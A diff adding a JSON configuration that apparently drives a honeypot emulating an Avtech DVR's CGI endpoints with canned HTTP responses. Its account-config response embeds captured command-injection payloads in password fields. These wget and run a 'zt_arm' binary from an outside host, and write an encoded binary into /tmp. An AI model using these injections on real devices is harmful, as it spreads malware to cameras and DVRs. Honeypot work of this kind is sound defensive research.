@@ -1,0 +1,69 @@
+{
+    "tags"   : [ "avtech" ],
+    "states" : {
+        "_START" : [
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/user/Config.cgi\\?.cab&action=get&category=Account",
+                "output"  : "HTTP/1.0 200 OK\r\nDate: Tue, 24 Oct 2017 17:13:52 GMT\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 1801\r\n\r\n0\nOK\nAccount.Maxuser=10\nAccount.LocalPassword=0000\nAccount.OperatorPassword=0000\nAccount.AnonymousLogin=DISABLE\nAccount.AdvenceUserLevel=OFF\nAccount.User1.Username=admin\nAccount.User1.Password=admin\nAccount.User1.Level=SUPERVISOR\nAccount.User1.Lifetime=INFINITE\nAccount.User2.Username=cnt31\nAccount.User2.Password=;cd /tmp/ && wget http://ztccds.freesfocss.com/zt_arm && chmod +x zt_arm && ./zt_arm;\nAccount.User2.Level=SUPERVISOR\nAccount.User2.Lifetime=5 MIN\nAccount.User3.Username=cnt31\nAccount.User3.Password=;cd /tmp/ && wget http://ztccds.freesfocss.com/zt_arm && chmod +x zt_arm && ./zt_arm;\nAccount.User3.Level=SUPERVISOR\nAccount.User3.Lifetime=5 MIN\nAccount.User4.Username=c2t31\nAccount.User4.Password=;cd /tmp/ && wget http://ztccds.freesfocss.com/zt_arm && chmod +x zt_arm && ./zt_arm;\nAccount.User4.Level=SUPERVISOR\nAccount.User4.Lifetime=5 MIN\nAccount.User7.Username=test\nAccount.User7.Password=;dd if=/tmp/.y of=/tmp/.Y count=1 bs=2720;mv /tmp/.Y /tmp/.y;\nAccount.User7.Level=SUPERVISOR\nAccount.User7.Lifetime=5 MIN\nAccount.User5.Username=test\nAccount.User5.Password=;printf '\\231\\217\\036\\143\\010\\171\\346\\005\\327\\151\\221\\044\\265\\317\\367\\337\\214\\316\\151\\264\\070\\130\\007\\314\\122\\027\\300\\054\\324\\100\\013\\203\\075\\155\\312\\363\\366\\310\\131\\002\\007\\020\\316\\357\\256\\054\\312\\306\\262\\124\\263\\074\\041\\205\\173\\310\\031\\156\\232\\121\\346\\361\\306\\052\\242\\245\\344\\264\\160\\071\\314\\012\\021\\166\\125\\233\\011\\033\\370\\033\\127\\202\\047\\240\\375\\335\\015\\176\\170\\307\\161\\033\\172\\132\\267\\302\\353\\336\\275\\001\\271\\274\\033\\160\\375\\235\\011\\377\\063\\115\\276\\305\\070\\355\\175\\267\\273\\217\\352\\236\\230\\332\\056\\327\\301\\076\\102\\016\\177\\126\\245\\023\\352\\041\\345\\150\\075\\262\\250\\114\\053\\332\\242\\322\\245\\242\\045\\011\\101\\144\\307\\124\\144\\173\\240\\031\\346\\074\\012\\172'>>/tmp/.y;\nAccount.User5.Level=SUPERVISOR\nAccount.User5.Lifetime=5 MIN\n",
+                "tags" : ["fingerprint"],
+                "next" : "_END"
+            },
+            {
+                "pattern" : "^GET /cgi-bin/nobody/Machine.cgi\\?action=get_capability",
+                "output"  : "HTTP/1.0 200 OK\r\nDate: Tue, 24 Oct 2017 12:19:13 GMT\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 756\r\n\r\n0\r\nOK\r\nFirmware.Version=1012-1001-1005-1003\r\nMACAddress=00:0E:53:04:B0:AD\r\nProduct.Type=DVR\r\nProduct.ID=798A\r\nProduct.ShortName=V_Indep\r\nVideo.System=NTSC\r\nAudio.DownloadFormat=ULAW\r\nVideo.Input.Num=16\r\nVideo.Output.Num=2\r\nVideo.Format=H264,MJPEG\r\nVideo.Format.Default=H264\r\nVideo.Resolution=4CIF,CIF\r\nVideo.Quality=BEST,HIGH,NORMAL,BASIC\r\nVideo.Local.Input.Num=16\r\nVideo.Local.Output.Num=2\r\nVideo.Local.Format=H264,MJPEG\r\nAudio.Input.Num=4\r\nAudio.Output.Num=0\r\nAudio.Format=ULAW\r\nAudio.Local.Input.Num=4\r\nAudio.Local.Output.Num=2\r\nAudio.Local.Format=PCM\r\nLanguage.Default=ENGLISH\r\nLanguage.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&\r\nCapability=0,0,1E,43\r\n",
+		"tags" : ["fingerprint"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/nobody/Search.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/user/Config.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/cgibox",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/nobody/VerifyCode.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/supervisor/CloudSetup.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/supervisor/adcommand.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            },
+            {
+                "pattern" : "^(GET|POST) /cgi-bin/supervisor/PwdGrp.cgi",
+                "output"  : "HTTP/1.0 200 OK\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 10\r\n\r\n0\r\nOK\r\n",
+		"tags" : ["exploit"],
+		"next" : "_END"
+            }
+        ],
+        "_SHARED" : [
+            {
+                "pattern" : "^(GET|POST)",
+                "output"  : "HTTP/1.0 404 Not Found\r\nnServer: Linux/2.x UPnP/1.0 Avtech/1.0\r\nExpires: 0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nConnection: close\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n",
+                "next"    : "_END",
+		"tags" : ["404"]
+            }
+        ]
+    }
+}
